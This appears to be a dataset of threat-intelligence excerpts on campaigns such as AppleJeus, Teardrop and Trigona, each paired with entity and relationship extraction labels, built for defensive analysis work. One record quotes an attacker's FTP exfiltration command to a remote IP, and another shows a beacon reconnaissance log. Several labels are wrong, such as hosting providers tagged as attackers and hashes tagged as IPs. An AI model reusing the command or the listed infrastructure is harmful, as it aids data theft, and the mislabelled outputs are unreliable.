{"instruction": "The Backdoor.Teardrop sample is a DLL with malicious code contained in the export Tk_CreateImageType. When executed, that export reads a file named upbeat_anxiety.jpg from the current directory and ensures it has a jpg header. It will also check that the registry key HKCU\\Software\\Microsoft\\CTF exists. An embedded copy of Cobalt Strike is then extracted. That CobaltStrike samples connects a C&C server - infinitysoftwares[.]com. At this point, the attackers launch WMI to execute rundll32.exe to load another malicious DLL called resources.dll in the path csidl_windows\\desktoptileresources\\. Resources.dll attempts to obtain credentials by accessing lsass.exe using similar techniques to Mimikatz, a widely used credential dumping tool.", "input": null, "output": "Named Entities: (Backdoor.Teardrop, malware), (upbeat_anxiety.jpg, file), (Cobalt Strike, tool), (infinitysoftwares[.]com, Domain), (rundll32.exe, file), (resources.dll, file), (lsass.exe, file), (Mimikatz, tool)\nRelationships: (Backdoor.Teardrop, extract, Cobalt Strike), (Cobalt Strike, connect, infinitysoftwares[.]com), (rundll32.exe, load, resources.dll), (resources.dll, access, lsass.exe), (resources.dll, use, Mimikatz)"}
{"instruction": "During our investigation, we found another IP address on June 3 that was still active at the time of writing. This IP address, which uses port 3000 and the title Blog, is within the IP range of the previous addresses. We surmise that the threat actor relocates some of its infrastructure when their IP address is exposed. Using this third leak site, we were able to find their file storage site (aeey7hxzgl6zowiwhteo5xjbf6sb36tkbn5hptykgmbsjrbiygv4c4id[.]onion). This site hosts critical data stolen from victims such as documents, contracts, and other large amounts of data. The Trigona ransomware group has poor operational security when it comes to the implementation of Tor sites \u2014 although their aim of targeting poorly-managed SQL servers is not something we usually see with less technically-proficient threat actors. Our ransomware spotlight on TargetCompany shows another group using a similar technique of targeting SQL servers.", "input": null, "output": "Named Entities: (aeey7hxzgl6zowiwhteo5xjbf6sb36tkbn5hptykgmbsjrbiygv4c4id[.]onion, Domain)\nRelationships: No related relations."}
{"instruction": "We classified the top 10 alive times into three clusters: 473 seconds, 200 seconds, and 170 seconds. Since many analysis systems are involved, we think that these times are some of the more common timeout settings for different sandboxes. For example, the default timeout setting in the CAPEv2 sandbox is exactly 200 seconds. Unfortunately, we could not confirm what the other alive times are for. Bad operational security During our investigation, we collected several download links for malicious archive files. We noticed that the threat actors distributed not only Google Drive links but also other IP addresses hosted by different cloud providers. Here are some download links that we recently observed: IP/Domain Path http://80[.]85[.]156[.]232 /fav/tw1 http://80[.]85[.]156[.]240 /fav/sWjp /fav/hKjp /fav/sNjp /fav/gTjp /fav/aMjp /fav/128tr /fav/128tw /fav/yMjp http://80[.]85[.]156[.]151 /fav/eeAll http://103[.]159[.]132[.]91 /fav/trteamC /fav/trA /fav/trHatip /file/tr /file/lv https://sa2il[.]johnsimde[.]xyz /f/LV https://iot[.]johnsimde[.]xyz /f/TR https://em2in[.]johnsimde[.]xyz /f/LV https://rewards[.]roshan[.]af /aspnet_client/gdrive.htm /aspnet_client/View.htm /aspnet_client/acv.htm Table 8. Download sites", "input": null, "output": "Named Entities: (Google Drive, tool), (80[.]85[.]156[.]232, IP), (80[.]85[.]156[.]240, IP), (80[.]85[.]156[.]151, IP), (103[.]159[.]132[.]91, IP), (sa2il[.]johnsimde[.]xyz, Domain), (iot[.]johnsimde[.]xyz, Domain), (em2in[.]johnsimde[.]xyz, Domain), (rewards[.]roshan[.]af, Domain)\nRelationships: No related relations."}
{"instruction": "3 . Requesting information on the domain account blocking policy (protection against brute force) beacon> shell net accounts / dom Tasked beacon to run: net accounts / dom host called home, sent: 48 bytes received output: The request will be processed at a domain controller for domain [redacted]construction.com. Force user logoff how long after time expires ?: Never Minimum password age (days): 1 Maximum password age (days): 42 Minimum password length: 6 Length of password history maintained: 24 Lockout threshold: Never Lockout duration (minutes): 30 Lockout observation window (minutes): 30 Computer role: BACKUP Figure 5. More Context into the Forced User Logoff Module", "input": null, "output": "Named Entities: (protection against brute force, threat type), (beacon, tool), (redacted]construction.com, Domain)\nRelationships: No related relations."}
{"instruction": "The infection starts once the user searches for \u201cWinSCP Download\u201d on the Bing search engine. A malicious ad for the WinSCP application is displayed above the organic search results. The ad leads to a suspicious website containing a tutorial on how to use WinSCP for automating file transfer. From this first page, the user is then redirected to a cloned download webpage of WinSCP (winsccp[.]com). Once the user selects the \u201cDownload\u201d button, an ISO file is downloaded from an infected WordPress webpage (hxxps://events.drdivyaclinic[.]com). Recently, the malicious actor changed their final stage payload URL to the file-sharing service 4shared. The overall infection flow involves delivering the initial loader, fetching the bot core, and ultimately, dropping the payload, typically a backdoor. In summary, the malicious actor uses the following malvertising infection chain:", "input": null, "output": "Named Entities: (Bing search engine, tool), (WinSCP application, tool), (winsccp[.]com, Domain), (hxxps://events.drdivyaclinic[.]com, URL), (4shared, tool), (infected WordPress webpage, tool), (bot core, malware), (payload, malware), (backdoor, malware)\nRelationships: (Bing search engine, leads to, WinSCP application), (WinSCP application, leads to, winsccp[.]com), (winsccp[.]com, redirects to, infected WordPress webpage), (malicious actor, changed URL to, 4shared), (malicious actor, uses, infected WordPress webpage), (malicious actor, uses, bot core), (malicious actor, drops, payload)"}
{"instruction": "https[://]twitter.com/naerycrypto/status/1637226997817692161 https[://]twitter.com/CiervoKing/status/1637220583736762370 c) They post fake job vacancies and entice job hunters to download their malware binary: https[://]twitter.com/witty_taeil/status/1631654308218298368 Table 1. List of websites and social media accounts with fake advertisements and equivalent real games cybercriminals plagiarized from Website Twitter account App name Confirmed downloaded file (SHA256) Original game website ryzex[.]io/ https[://]twitter.com/RyzeX_web3 RYZEX https[://]drunk-robots.com/ pearlmetaverse[.]io/ https[://]twitter.com/MetaversePearl Pearl Land mysteriangame[.]com https[://]twitter.com/MysterianGame Mysterian worldofcreatures[.]io https[://]twitter.com/WOC_io/ World of Creatures 8ea33c34647578b79dd8bb7dcf01a8ad1c79e7ada3fd61aca397ed0a2ac57276 https[://]cryptureworld.com/ toncap[.]io https[://]twitter.com/neuromaster9/status/1614074785289437184?s=61 https[://]twitter.com/yoshisakatahi/status/1615686095307522049?s=61 Compared to other fake apps, this is publicized using a personal account (instead of an \u201cofficial\u201d business account). Ton Caps 7bb7b51494c60401c8535baaa30cddb1c41c436e778092f30db5260c42cc70f6 play-impulseflow[.]com https[://]twitter.com/lmpulse_Flow Impulse Flow 02e1d9ea3a0c16106d173b0e6349a18a9aeafacc38650e359cfe1ee2298aaa45 https[://]embersword.com https[://]twitter.com/PureMetaverse https[://]twitter.com/MetaPureLand Pureland Some people have posted on Twitter accounts warning about the malicious activities associated with the fake game apps and websites. Conclusion", "input": null, "output": "Named Entities: (https[://]twitter.com/naerycrypto/status/1637226997817692161, URL), (https[://]twitter.com/CiervoKing/status/1637220583736762370, URL), (https[://]twitter.com/witty_taeil/status/1631654308218298368, URL), (ryzex[.]io/, Domain), (https[://]twitter.com/RyzeX_web3, URL), (pearlmetaverse[.]io/, Domain), (https[://]twitter.com/MetaversePearl, URL), (mysteriangame[.]com, Domain), (https[://]twitter.com/MysterianGame, URL), (worldofcreatures[.]io, Domain), (https[://]twitter.com/WOC_io/, URL), (8ea33c34647578b79dd8bb7dcf01a8ad1c79e7ada3fd61aca397ed0a2ac57276, SHA256), (https[://]cryptureworld.com/, URL), (toncap[.]io, Domain), (https[://]twitter.com/neuromaster9/status/1614074785289437184?s=61, URL), (https[://]twitter.com/yoshisakatahi/status/1615686095307522049?s=61, URL), (7bb7b51494c60401c8535baaa30cddb1c41c436e778092f30db5260c42cc70f6, SHA256), (play-impulseflow[.]com, Domain), (https[://]twitter.com/lmpulse_Flow, URL), (02e1d9ea3a0c16106d173b0e6349a18a9aeafacc38650e359cfe1ee2298aaa45, SHA256),  (https[://]embersword.com, URL), (https[://]twitter.com/PureMetaverse, URL), (https[://]twitter.com/MetaPureLand, URL)\nRelationships: No related relationships."}
{"instruction": "USB Driver.exe then starts checking whether it is properly installed. If it is installed, it will start to infect more removable disks and copy files to a folder named autorun.inf. If it is not installed, it installs itself to %programdata% and then sets the registry run key for persistence. Finally, the ACNSHELL malware rzlog4cpp.dll is sideloaded. It will then create a reverse shell via ncat.exe to the server closed[.]theworkpc[.]com.", "input": null, "output": "Named Entities: (USB Driver.exe, file), (autorun.inf, file), (ACNSHELL malware, malware), (rzlog4cpp.dll, file), (ncat.exe, file), (closed[.]theworkpc[.]com, Domain)\nRelationships: (USB Driver.exe, copy, autorun.inf), (USB Driver.exe, sideload, ACNSHELL malware), (ACNSHELL malware, create, reverse shell), (reverse shell, connect to, closed[.]theworkpc[.]com)"}
{"instruction": "Attribution\nOur findings allow us to attribute this attack to the Earth Kitsune threat actor with medium confidence. Injecting malicious scripts into North Korean-related websites shows a similar modus operandi and victimology to the previous activities of the group. Furthermore, the delivery server and the C&C server of WhiskerSpy used in this attack have two infrastructure overlaps with our previous research on Operation Earth Kitsune.\nThe first overlap we noticed is that both WhiskerSpy's C&C domain londoncity[.]hopto[.]org and Earth Kitsune\u2019s domain rs[.]myftp[.]biz were resolved to the same IP address 45[.]76[.]62[.]198.\nThe second overlap is that WhiskerSpy\u2019s C&C domains londoncity[.]hopto[.]org and updategoogle[.]servehttp[.]com, plus the domain of the delivery server microsoftwindow[.]sytes[.]net were all resolved to 172[.]93[.]201[.]172. This IP address was also mapped from the domain selectorioi[.]ddns[.]net which was used by Earth Kitsune\u2019s agfSpy backdoor.", "input": null, "output": "Named Entities: (Earth Kitsune, attacker), (WhiskerSpy, malware), (Londoncity[.]hopto[.]org, Domain), (rs[.]myftp[.]biz, Domain), (45[.]76[.]62[.]198, IP), (updategoogle[.]servehttp[.]com, Domain), (microsoftwindow[.]sytes[.]net, Domain), (172[.]93[.]201[.]172, IP), (selectorioi[.]ddns[.]net, Domain), (agfSpy, malware)\nRelationships: (Earth Kitsune, attribution, WhiskerSpy), (WhiskerSpy, C&C domain, updategoogle[.]servehttp[.]com), (WhiskerSpy, delivery server domain, microsoftwindow[.]sytes[.]net)"}
{"instruction": "In July 2022, we found two potentially hacked Facebook accounts advertising scam messages on some Taiwanese community groups claiming users could get an allowance for hurricane, flood, and COVID victims\u2019 assistance. The posts cited that users could register in download.tw1988[.]link to apply, which is in fact a phishing site. Unwitting users could have been victimized as the link masqueraded as the official government website https://1988.taiwan.gov.tw/ used to provide allowances for people in difficult situations. Supplementary Scams: Sextortion and Cryptocurrency Tracking the network infrastructure used by TgToxic, we subsequently found the threat actors also behind sextortion and cryptocurrency scams in Taiwan and Indonesia. The malicious apps could also be downloaded from the same website down[.]tw1988[.]link and masqueraded as dating, messaging, lifestyle, or cryptocurrency-related apps to trick users into installing and enabling the permissions for it. Recent Activities: Phishing in Thailand", "input": null, "output": "Named Entities: (Facebook accounts, attacker), (download.tw1988[.]link, Domain), (TgToxic, attacker)\nRelationships: (Facebook accounts, advertise, scam messages), (scam messages, cite, download.tw1988[.]link), (TgToxic, behind, sextortion and cryptocurrency scams)"}
{"instruction": "Further research revealed that a phishing email from a Celas LLC company (Phishing: Spearphishing Link [T1566.002]) recommended the trojanized cryptocurrency trading application to victims. The email provided a link to the Celas\u2019 website, celasllc[.]com (Acquire Infrastructure: Domain [T1583.001]), where the victim could download a Windows or macOS version of the trojanized application. The celasllc[.]com domain resolved to the following Internet Protocol (IP) addresses from May 29, 2018, to January 23, 2021. 45.199.63[.]220 107.187.66[.]103 145.249.106[.]19 175.29.32[.]160 185.142.236[.]213 185.181.104[.]82 198.251.83[.]27 208.91.197[.]46 209.99.64[.]18 The celasllc[.]com domain had a valid Sectigo (previously known as Comodo) Secure Sockets Layer (SSL) certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was \u201cDomain Control Validated,\u201d a weak security verification level that does not require validation of the owner\u2019s identity or the actual business\u2019s existence. Celas Trade Pro Application Analysis Windows Program", "input": null, "output": "Named Entities: (Celas LLC, attacker), (Phishing: Spearphishing Link, threat type), (celasllc[.]com, Domain), (45.199.63[.]220, IP), (107.187.66[.]103, IP), (145.249.106[.]19, IP), (175.29.32[.]160, IP), (185.142.236[.]213, IP), (185.181.104[.]82, IP), (198.251.83[.]27, IP), (208.91.197[.]46, IP), (209.99.64[.]18, IP), (Sectigo, tool), (SSL certificate, tool), (Comodo, tool), (Secure Sockets Layer, tool), (Celas Trade Pro Application, tool), (Windows Program, tool)\nRelationships: (Celas LLC, use, Phishing: Spearphishing Link), (Phishing: Spearphishing Link, domain, celasllc[.]com), (celasllc[.]com, IP, 45.199.63[.]220), (celasllc[.]com, IP, 107.187.66[.]103), (celasllc[.]com, IP, 145.249.106[.]19), (celasllc[.]com, IP, 175.29.32[.]160), (celasllc[.]com, IP, 185.142.236[.]213), (celasllc[.]com, IP, 185.181.104[.]82), (celasllc[.]com, IP, 198.251.83[.]27), (celasllc[.]com, IP, 208.91.197[.]46), (celasllc[.]com, IP, 209.99.64[.]18), (celasllc[.]com, tool, Sectigo), (Sectigo, tool, SSL certificate), (Celas Trade Pro Application, tool, Windows Program)"}
{"instruction": "The Windows version of the malicious Celas Trade Pro application is an MSI Installer (.msi). The MSI Installer installation package comprises a software component and an application programming interface (API) that Microsoft uses for the installation, maintenance, and removal of software. The installer looks legitimate and is signed by a valid Sectigo certificate that was purchased by the same user as the SSL certificate for celasllc[.]com (Obtain Capabilities: Code Signing Certificates [T1588.003]). The MSI Installer asks the victim for administrative privileges to run (User Execution: Malicious File [T1204.002]). Once permission is granted, the threat actor is able to run the program with elevated privileges (Abuse Elevation Control Mechanism [T1548]) and MSI executes the following actions. Installs CelasTradePro.exe in folder C:\\Program Files (x86)\\CelasTradePro Installs Updater.exe in folder C:\\Program Files (x86)\\CelasTradePro Runs Updater.exe with the CheckUpdate parameters", "input": null, "output": "Named Entities: (Celas Trade Pro, malware), (MSI Installer, tool), (celasllc[.]com, Domain), (Sectigo certificate, tool), (C:\\Program Files (x86)\\CelasTradePro\\Updater.exe, file)\nRelationships: (Celas Trade Pro, use, MSI Installer), (celasllc[.]com, signed by, Sectigo certificate), (Sectigo certificate, used for, celasllc[.]com)"}
{"instruction": "AppleJeus Version 2: JMT Trading Introduction and Infrastructure In October 2019, a cybersecurity company identified a new version of the AppleJeus malware\u2014JMT Trading\u2014thanks to its many similarities to the original AppleJeus malware. Again, the malware was in the form of a cryptocurrency trading application, which a legitimate-looking company, called JMT Trading, marketed and distributed on their website, jmttrading[.]org (Acquire Infrastructure: Domain [T1583.001]). This website contained a \u201cDownload from GitHub\u201d button, which linked to JMT Trading\u2019s GitHub page (Acquire Infrastructure: Web Services [T1583.006]), where Windows and macOS X versions of the JMT Trader application were available for download (Develop Capabilities: Malware [T1587.001]). The GitHub page also included .zip and tar.gz files containing the source code. The jmttrading[.]org domain resolved to the following IP addresses from October 15, 2016, to January 22, 2021. 45.33.2[.]79 45.33.23[.]183 45.56.79[.]23 45.79.19[.]196 96.126.123[.]244 146.112.61[.]107 184.168.221[.]40 184.168.221[.]57 198.187.29[.]20 198.54.117[.]197 198.54.117[.]198 198.54.117[.]199 198.54.117[.]200 198.58.118[.]167", "input": null, "output": "Named Entities: (AppleJeus Version 2, malware), (JMT Trading, malware), (jmttrading[.]org, Domain), (45.33.2[.]79, IP), (45.33.23[.]183, IP), (45.56.79[.]23, IP), (45.79.19[.]196, IP), (96.126.123[.]244, IP), (146.112.61[.]107, IP), (184.168.221[.]40, IP), (184.168.221[.]57, IP), (198.187.29[.]20, IP), (198.54.117[.]197, IP), (198.54.117[.]198, IP), (198.54.117[.]199, IP), (198.54.117[.]200, IP), (198.58.118[.]167, IP)\nRelationships: (AppleJeus Version 2, identified as, JMT Trading), (JMT Trading, marketed and distributed on, jmttrading[.]org), (jmttrading[.]org, resolved to, 45.33.2[.]79), (jmttrading[.]org, resolved to, 45.33.23[.]183), (jmttrading[.]org, resolved to, 45.56.79[.]23), (jmttrading[.]org, resolved to, 45.79.19[.]196), (jmttrading[.]org, resolved to, 96.126.123[.]244), (jmttrading[.]org, resolved to, 146.112.61[.]107), (jmttrading[.]org, resolved to, 184.168.221[.]40), (jmttrading[.]org, resolved to, 184.168.221[.]57), (jmttrading[.]org, resolved to, 198.187.29[.]20), (jmttrading[.]org, resolved to, 198.54.117[.]197), (jmttrading[.]org, resolved to, 198.54.117[.]198), (jmttrading[.]org, resolved to, 198.54.117[.]199), (jmttrading[.]org, resolved to, 198.54.117[.]200), (jmttrading[.]org, resolved to, 198.58.118[.]167)"}
{"instruction": "The jmttrading[.]org domain had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was \u201cDomain Control Validated,\u201d a weak security verification level that does not require validation of the owner\u2019s identity or the actual business\u2019s existence. The current SSL certificate was issued by Let\u2019s Encrypt. JMT Trading Application Analysis Windows Program The Windows version of the malicious cryptocurrency application is an MSI Installer. The installer looks legitimate and has a valid digital signature from Sectigo (Obtain Capabilities: Digital Certificates [T1588.004]). The signature was signed with a code signing certificate purchased by the same user as the SSL certificate for jmttrading[.]org (Obtain Capabilities: Code Signing Certificates [T1588.003]). The MSI Installer asks the victim for administrative privileges to run (User Execution: Malicious File [T1204.002]). Once permission is granted, the MSI executes the following actions. Installs JMTTrader.exe in folder C:\\Program Files (x86)\\JMTTrader Installs CrashReporter.exe in folder C:\\Users\\<username>\\AppData\\Roaming\\JMTTrader", "input": null, "output": "Named Entities: (jmttrading[.]org, Domain), (Sectigo SSL certificate, tool), (Let's Encrypt, tool), (MSI Installer, tool), (Sectigo, tool), (JMTTrader.exe, file), (CrashReporter.exe, file)\nRelationships: (jmttrading[.]org, has, Sectigo SSL certificate), (Sectigo SSL certificate, issued by, Let's Encrypt), (MSI Installer, installs, JMTTrader.exe), (MSI Installer, installs, CrashReporter.exe)"}
{"instruction": "AppleJeus Version 3: Union Crypto Introduction and Infrastructure In December 2019, another version of the AppleJeus malware was identified on Twitter by a cybersecurity company based on many similarities to the original AppleJeus malware. Again, the malware was in the form of a cryptocurrency trading application, which was marketed and distributed by a legitimate-looking company, called Union Crypto, on their website, unioncrypto[.]vip (Acquire Infrastructure: Domain [T1583.001]). Although this website is no longer available, a cybersecurity researcher discovered a download link, https://www.unioncrypto[.]vip/download/W6c2dq8By7luMhCmya2v97YeN, recorded on VirusTotal for the macOS X version of UnionCryptoTrader. In contrast, open-source reporting stated that the Windows version might have been downloaded via instant messaging service Telegram, as it was found in a \u201cTelegram Downloads\u201d folder on an unnamed victim.[7] The unioncrypto[.]vip domain resolved to the following IP addresses from June 5, 2019, to July 15, 2020. 104.168.167[.]16 198.54.117[.]197 198.54.117[.]198 198.54.117[.]199 198.54.117[.]200", "input": null, "output": "Named Entities: (AppleJeus, malware), (Union Crypto, attacker), (unioncrypto[.]vip, Domain), (https://www.unioncrypto[.]vip/download/W6c2dq8By7luMhCmya2v97YeN, URL), (104.168.167[.]16, IP), (198.54.117[.]197, IP), (198.54.117[.]198, IP), (198.54.117[.]199, IP), (198.54.117[.]200, IP)\nRelationships: (Union Crypto, domain, unioncrypto[.]vip), (unioncrypto[.]vip, resolved to, 104.168.167[.]16), (unioncrypto[.]vip, resolved to, 198.54.117[.]197), (unioncrypto[.]vip, resolved to, 198.54.117[.]198), (unioncrypto[.]vip, resolved to, 198.54.117[.]199), (unioncrypto[.]vip, resolved to, 198.54.117[.]200), (unioncrypto[.]vip, recorded on, https://www.unioncrypto[.]vip/download/W6c2dq8By7luMhCmya2v97YeN)"}
{"instruction": "The domain unioncrypto[.]vip had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was \u201cDomain Control Validated,\u201d a weak security verification level that does not require validation of the owner\u2019s identity or the actual business\u2019s existence. Union Crypto Trader Application Analysis Windows Program The Windows version of the malicious cryptocurrency application is a Windows executable (.exe) (User Execution: Malicious File [T1204.002]), which acts as an installer that extracts a temporary MSI Installer. The Windows program executes the following actions. Extracts UnionCryptoTrader.msi to folder C:\\Users\\<username>\\AppData\\Local\\Temp\\{82E4B719-90F74BD1-9CF1-56CD777E0C42} Runs UnionCryptoUpdater.msi Installs UnionCryptoTrader.exe in folder C:\\Program Files\\UnionCryptoTrader Installs UnionCryptoUpdater.exe in folder C:\\Users\\<username>\\AppData\\Local\\UnionCryptoTrader Deletes UnionCryptoUpdater.msi Runs UnionCryptoUpdater.exe", "input": null, "output": "Named Entities: (unioncrypto[.]vip, Domain), (Sectigo SSL certificate, tool), (T1588.004, technique), (Union Crypto Trader Application, tool), (Windows Program, tool), (T1204.002, technique), (UnionCryptoTrader.msi, file), (UnionCryptoUpdater.msi, file), (UnionCryptoUpdater.exe, file)\nRelationships: (unioncrypto[.]vip, had, Sectigo SSL certificate), (unioncrypto[.]vip, seen in, Windows Program), (Windows Program, extracts, UnionCryptoTrader.msi), (Windows Program, runs, UnionCryptoUpdater.msi), (Windows Program, installs, UnionCryptoUpdater.exe), (Windows Program, deletes, UnionCryptoUpdater.msi), (Windows Program, runs, UnionCryptoUpdater.exe)"}
{"instruction": "AppleJeus Version 4: Kupay Wallet Introduction and Infrastructure On March 13, 2020, a new version of the AppleJeus malware was identified. The malware was marketed and distributed by a legitimate-looking company, called Kupay Wallet, on their website kupaywallet[.]com (Acquire Infrastructure: Domain [T1583.001]). The domain www.kupaywallet[.]com resolved to IP address 104.200.67[.]96 from March 20, 2020, to January 16, 2021. CrownCloud US, LLC controlled the IP address (autonomous system number [ASN] 8100), and is located in New York, NY. The domain www.kupaywallet[.]com had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was \u201cDomain Control Validated,\u201d a weak security verification level that does not require validation of the owner\u2019s identity or the actual business\u2019s existence. Kupay Wallet Application Analysis Windows Program The Windows version of the malicious cryptocurrency application is an MSI Installer. The MSI executes the following actions. Installs Kupay.exe in folder C:\\Program Files (x86)\\Kupay", "input": null, "output": "Named Entities: (AppleJeus, malware), (Kupay Wallet, tool), (kupaywallet[.]com, Domain), (104.200.67[.]96, IP), (CrownCloud US, LLC, attacker), (Sectigo SSL certificate, tool)\nRelationships: (AppleJeus, marketed and distributed by, Kupay Wallet), (Kupay Wallet, domain, kupaywallet[.]com), (kupaywallet[.]com, resolved to, 104.200.67[.]96), (104.200.67[.]96, controlled by, CrownCloud US, LLC), (kupaywallet[.]com, had, Sectigo SSL certificate)"}
{"instruction": "AppleJeus Version 5: CoinGoTrade Introduction and Infrastructure In early 2020, another version of the AppleJeus malware was identified. This time the malware was marketed and distributed by a legitimate-looking company called CoinGoTrade on their website coingotrade[.]com (Acquire Infrastructure: Domain [T1583.001]). The domain CoinGoTrade[.]com resolved to IP address 198.54.114[.]175 from February 28, 2020, to January 23, 2021. The IP address is controlled by NameCheap Inc. (ASN 22612) and is located in Atlanta, GA. This IP address is in the same ASN for Dorusio[.]com and Ants2Whale[.]com. The domain CoinGoTrade[.]com had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was \u201cDomain Control Validated,\u201d a weak security verification level that does not require validation of the owner\u2019s identity or the actual business\u2019s existence. CoinGoTrade Application Analysis Windows Program", "input": null, "output": "Named Entities: (AppleJeus Version 5, malware), (CoinGoTrade, attacker), (coingotrade[.]com, Domain), (198.54.114[.]175, IP), (NameCheap Inc., attacker), (Dorusio[.]com, Domain), (Ants2Whale[.]com, Domain), (Sectigo, tool), (SSL certificate, tool)\nRelationships: (AppleJeus Version 5, marketed and distributed by, CoinGoTrade), (CoinGoTrade, domain, coingotrade[.]com), (coingotrade[.]com, resolved to, 198.54.114[.]175), (198.54.114[.]175, controlled by, NameCheap Inc.), (coingotrade[.]com, same ASN, Dorusio[.]com), (coingotrade[.]com, same ASN, Ants2Whale[.]com), (coingotrade[.]com, had, SSL certificate)"}
{"instruction": "AppleJeus Version 6: Dorusio Introduction and Infrastructure In March 2020, an additional version of the AppleJeus malware was identified. This time the malware was marketed and distributed by a legitimate-looking company called Dorusio on their website, dorusio[.]com (Acquire Infrastructure: Domain [T1583.001]). Researchers collected samples for Windows and macOS X versions of the Dorusio Wallet (Develop Capabilities: Malware [T1587.001]). As of at least early 2020, the actual download links result in 404 errors. The download page has release notes with version revisions claiming to start with version 1.0.0, released on April 15, 2019. The domain dorusio[.]com resolved to IP address 198.54.115[.]51 from March 30, 2020 to January 23, 2021. The IP address is controlled by NameCheap Inc. (ASN 22612) and is located in Atlanta, GA. This IP address is in the same ASN for CoinGoTrade[.]com and Ants2Whale[.]com.", "input": null, "output": "Named Entities: (AppleJeus, malware), (Dorusio, attacker), (dorusio[.]com, Domain), (T1583.001, technique), (T1587.001, technique), (198.54.115[.]51, IP), (NameCheap Inc., attacker), (CoinGoTrade[.]com, Domain), (Ants2Whale[.]com, Domain)\nRelationships: (AppleJeus, distributed by, Dorusio), (Dorusio, website, dorusio[.]com), (dorusio[.]com, Acquire Infrastructure, T1587.001), (Dorusio, malware, AppleJeus), (Dorusio, develop capabilities, T1587.001), (dorusio[.]com, resolve to, 198.54.115[.]51), (198.54.115[.]51, controlled by, NameCheap Inc.), (198.54.115[.]51, same ASN, CoinGoTrade[.]com), (198.54.115[.]51, same ASN, Ants2Whale[.]com)"}
{"instruction": "The domain dorusio[.]com had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was \u201cDomain Control Validated,\u201d a weak security verification level that does not require validation of the owner\u2019s identity or the actual business\u2019s existence. Dorusio Application Analysis Windows Program The Windows version of the malicious application is an MSI Installer. The installer appears to be legitimate and will install the following two programs. Installs Dorusio.exe in folder C:\\Program Files (x86)\\Dorusio Installs DorusioUpgrade.exe in folder C:\\Users\\<username>\\AppData\\Roaming\\DorusioSupport Runs DorusioUpgrade.exe The program, Dorusio.exe, loads a legitimate-looking cryptocurrency wallet platform with no signs of malicious activity and is a copy of an open-source cryptocurrency application.", "input": null, "output": "Named Entities: (dorusio[.]com, Domain), (Sectigo, tool), (Dorusio Application Analysis Windows Program, tool), (MSI Installer, tool), (Dorusio.exe, file), (DorusioUpgrade.exe, file)\nRelationships: (Dorusio Application Analysis Windows Program, installs, Dorusio.exe), (Dorusio Application Analysis Windows Program, installs, DorusioUpgrade.exe), (Dorusio.exe, runs, DorusioUpgrade.exe)"}
{"instruction": "Other machines on the same network \nWe saw suspicious activity on various machines on this same victim\u2019s network. The attackers targeted several other users within the organization with the same file, proposal_pakistan110.chm:error.html, which was opened by an archiver tool and, in one instance, via the Microsoft Edge browser. Following this, we observed a backdoor being executed on the machine, alongside additional tools downloaded to the %APPDATA% directory from the attacker\u2019s infrastructure. \nHash Directory Tool \n450ebd66ba67bb46bf18d122823ff07ef4a7b11afe63b6f269aec9236a1790cd CSIDL_COMMON_APPDATA\\oracle local.exe \nee32bde60d1175709fde6869daf9c63cd3227155e37f06d45a27a2f45818a3dc CSIDL_COMMON_APPDATA\\adobe adobe.exe \n071e20a982ea6b8f9d482685010be7aaf036401ea45e2977aca867cedcdb0217 c:\\programdata\\oracle java.ee", "input": null, "output": "Named Entities: (proposal_pakistan110.chm:error.html, file), (archiver tool, tool), (Microsoft Edge browser, tool), (backdoor, malware), (450ebd66ba67bb46bf18d122823ff07ef4a7b11afe63b6f269aec9236a1790cd, SHA256), (ee32bde60d1175709fde6869daf9c63cd3227155e37f06d45a27a2f45818a3dc, SHA256), (071e20a982ea6b8f9d482685010be7aaf036401ea45e2977aca867cedcdb0217, SHA256)\nRelationships: (proposal_pakistan110.chm:error.html, opened by, archiver tool), (proposal_pakistan110.chm:error.html, opened by, Microsoft Edge browser), (archiver tool, executed, backdoor), (attacker's infrastructure, IP, 450ebd66ba67bb46bf18d122823ff07ef4a7b11afe63b6f269aec9236a1790cd), (attacker's infrastructure, IP, ee32bde60d1175709fde6869daf9c63cd3227155e37f06d45a27a2f45818a3dc), (attacker's infrastructure, IP, 071e20a982ea6b8f9d482685010be7aaf036401ea45e2977aca867cedcdb0217)"}
{"instruction": "At this point, the attackers ceased activity while maintaining access to the network until February 21. At 06:38, the attackers were observed downloading a custom .NET FTP tool to the infected computer. 192.119.15.36 880 hxxp://192.119.15[DOT]36:880/ftp.exe Later at 6:56, the attackers exfiltrated data using this FTP tool to a remote host: JsuObf.exe Nup#Tntcommand -s CSIDL_PROFILE\\appdata\\roaming\\adobe\\rar -a ftp://89.34.237.118:2020 -f /[REDACTED] -u [REDACTED] -p [REDACTED] Activity ceased until the attackers returned on March 5 and were observed using Quasar RAT to download a second custom AutoIt FTP exfiltration tool known as FastUploader from hxxp://192.119.15[DOT]36:880/ftp.exe. This tool was then installed to csidl_profile\\appdata\\roaming\\adobe\\ftp.exe. FastUploader is a custom FTP tool designed to exfiltrate data at a faster rate than traditional FTP clients.", "input": null, "output": "Named Entities: (custom .NET FTP tool, tool), (192.119.15.36, IP), (hxxp://192.119.15[DOT]36:880/ftp.exe, URL), (JsuObf.exe, file), (89.34.237.118:2020, IP), (Quasar RAT, tool), (AutoIt FTP exfiltration tool, tool), (FastUploader, tool), (hxxp://192.119.15[DOT]36:880/ftp.exe, URL), (csidl_profile\\appdata\\roaming\\adobe\\ftp.exe, file)\nRelationships: (JsuObf.exe, exfiltrate data to, 89.34.237.118:2020), (Quasar RAT, download, FastUploader), (FastUploader, install to, csidl_profile\\appdata\\roaming\\adobe\\ftp.exe)"}
